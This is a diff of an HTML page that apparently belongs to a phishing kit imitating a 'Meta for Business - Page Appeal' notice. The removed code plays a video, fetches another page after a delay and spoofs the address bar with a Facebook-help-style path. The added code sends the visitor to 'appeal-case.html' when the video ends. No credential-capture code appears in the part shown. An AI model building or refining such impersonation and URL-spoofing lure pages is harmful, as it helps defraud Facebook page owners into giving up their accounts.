@@ -1,10 +1,7 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
   <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Meta for Business - Page Appeal</title>
-    <meta http-equiv="refresh" content="5;url=appeal-case.html" />
+    <title>Video và Index</title>
     <style>
       body,
       html {
@@ -21,33 +18,16 @@
       }
     </style>
   </head>
-
   <body>
     <video id="myVideo" autoplay muted playsinline>
-      <source src="./Mate.mp4" type="video/mp4" />
-      Your browser does not support the video tag.
+      <source src="Mate.mp4" type="video/mp4" />
     </video>
 
     <script>
-      setTimeout(function () {
-        var xhr = new XMLHttpRequest();
-        xhr.onreadystatechange = function () {
-          if (xhr.readyState === 4) {
-            if (xhr.status === 200) {
-              document.body.innerHTML = xhr.responseText;
-              history.pushState(
-                null,
-                "",
-                "204908296312159helpref=faq_conoent.html"
-              );
-            } else {
-              console.error("Error loading page");
-            }
-          }
-        };
-        xhr.open("GET", "204908296312159helpref=faq_conoent.html", true);
-        xhr.send();
-      }, 5500);
+      var videoElement = document.getElementById("myVideo");
+      videoElement.addEventListener("ended", function () {
+        window.location.href = "appeal-case.html";
+      });
     </script>
   </body>
 </html>
